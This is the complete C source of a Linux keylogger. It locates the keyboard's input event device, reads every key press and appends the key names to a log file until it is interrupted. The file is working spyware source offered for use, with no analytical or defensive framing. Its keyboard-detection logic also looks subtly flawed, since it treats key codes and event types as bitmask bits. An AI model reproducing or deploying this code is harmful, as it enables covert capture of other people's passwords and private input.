#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include "keylog.h"

char *get_keyboard_event_file();
void sigint_handler(int sig);
static int is_char_device(const struct dirent *file);

int running = 1;

int main(int argc, char *argv[]){
    int bytesRead = 0;
    int output_fd;
    int keyboard_fd;
    struct input_event events[NUM_EVENTS];

    char *KEYBOARD_DEVICE = get_keyboard_event_file();
    if (!KEYBOARD_DEVICE)
        return 2;

    if (argc < 2)
        return 1;

    if((output_fd = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0)
        return 1;

    if ((keyboard_fd = open(KEYBOARD_DEVICE, O_RDONLY)) < 0)
        return 2;

    signal(SIGINT, sigint_handler);

    while (running) {
        bytesRead = read(keyboard_fd, events, sizeof(struct input_event) * NUM_EVENTS);

        for (int i = 0; i < (bytesRead / sizeof(struct input_event)); ++i) {
            if (events[i].type == EV_KEY && events[i].value == 1) {
                if (events[i].code > 0 && events[i].code < NUM_KEYCODES)
                    write(output_fd, keycodes[events[i].code], strlen(keycodes[events[i].code]));    
                else
                    write(output_fd, "UNKNOWN", sizeof("UNKNOWN"));
                
                write(output_fd, "\n", strlen("\n"));
            }
        }
    }

    if (bytesRead > 0)
        write(output_fd, "\n", strlen("\n"));

    close(keyboard_fd);
    close(output_fd);
    free(KEYBOARD_DEVICE);

    return 0;
}

char *get_keyboard_event_file() {
    char *keyboard_file = NULL;
    struct dirent **event_files;
    char filename[512];

    int num = scandir(INPUT_DIR, &event_files, &is_char_device, &alphasort);
    if (num < 0)
        return NULL;
    else
        for (int i = 0; i < num; ++i) {
            int32_t event_bitmap = 0;
            int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z; 

            snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, event_files[i]->d_name);
            int fd = open(filename, O_RDONLY);

            if(fd == -1)
                continue;

            ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            
            if ((EV_KEY & event_bitmap) == EV_KEY) {
                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                
                if ((kbd_bitmap & event_bitmap) == kbd_bitmap){
                    keyboard_file = strdup(filename);
                    close(fd);
                    break;
                }
            }

            close(fd);
        }
    
    for (int i = 0; i < num; ++i)
        free(event_files[i]);

    free(event_files);

    return keyboard_file;
}

void sigint_handler(int sig) {
    running = 0;
}

static int is_char_device(const struct dirent *file) {
    struct stat filestat;
    char filename[512];

    snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, file->d_name);

    if (stat(filename, &filestat))
        return 0;

    return S_ISCHR(filestat.st_mode);
}